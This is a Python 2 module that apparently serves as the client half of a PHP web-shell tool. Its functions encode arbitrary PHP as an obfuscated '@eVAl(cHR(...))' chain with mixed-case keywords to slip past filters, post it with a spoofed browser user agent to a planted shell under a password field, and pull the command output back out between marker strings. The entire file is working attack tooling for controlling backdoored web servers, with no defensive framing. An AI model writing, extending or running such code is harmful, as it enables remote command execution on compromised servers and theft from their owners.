class payloadModule:
    '''functions for payload'''
    def phpDecode(self,phpcode):
        '''decode php code'''
        code = "@eVAl("
        for p in phpcode:
            code += "cHR(%s)."%ord(p)
        code = code[:len(code)-1]
        code += ");"
        return code

    def urlPOST(self,url,value):
        try:
            data = urllib.urlencode(value)
            user_agent = 'Mozilla/4.0 (commpatible;MSIE 5.5;Windows NT)'
            headers={'User-Agent':user_agent}
            req = urllib2.Request(url,data,headers)
            return urllib2.urlopen(req)
        except:
            return "false"
        
    def urlGET(self,url):
        try:
            return urllib2.urlopen(url)
        except:
            return "false"

    def getRes(self,url,pwd,c):
        '''get shell's response'''
        try:
            code = 'ecHO "{MST}";'
            code += c
            code += 'eChO "{MST}";'
            code = self.phpDecode(code)
            value = {pwd:code}
            tmp = self.urlPOST(url,value).read()
            tmp = tmp.split("{MST}")[1]
            return tmp
        except Exception,e:
            return e
            
if __name__=="__main__":
    print __doc__
else:
    global payload
    payload = payloadModule()
